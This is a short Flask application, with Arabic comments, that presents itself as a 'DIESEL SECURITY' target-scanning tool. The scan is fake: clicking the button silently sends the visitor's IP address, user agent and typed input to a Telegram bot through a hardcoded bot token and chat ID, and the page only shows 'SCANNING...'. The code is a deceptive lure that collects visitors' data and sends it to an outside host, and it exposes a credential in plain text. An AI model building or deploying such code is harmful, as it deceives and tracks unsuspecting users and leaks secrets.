import os
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# ضع التوكن والـ ID الخاصين بك هنا
TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU'
CHAT_ID = '5177962707'

# تصميم ثابت وجذاب (Front-end)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>DIESEL | SECURITY SYSTEM</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #0f0; padding: 40px; box-shadow: 0 0 15px #0f0; width: 400px; text-align: center; }
        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; }
        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box" id="ui">
        <h1>DIESEL SECURITY</h1>
        <input type="text" id="t" placeholder="Target System...">
        <button onclick="send()">SCAN TARGET</button>
    </div>
    <script>
        function send() {
            let t = document.getElementById('t').value;
            fetch('/data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target: t})
            });
            document.getElementById('ui').innerHTML = "<h1>SCANNING...</h1>";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/data', methods=['POST'])
def data():
    d = request.json
    # استخراج البيانات الحقيقية
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    
    # رسالة تليجرام منظمة
    msg = f"⚡️ **DIESEL REPORT**\n\n🎯 Target: {d.get('target')}\n🌐 IP: {ip}\n📱 Device: {ua}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                  data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    return {"status": "success"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
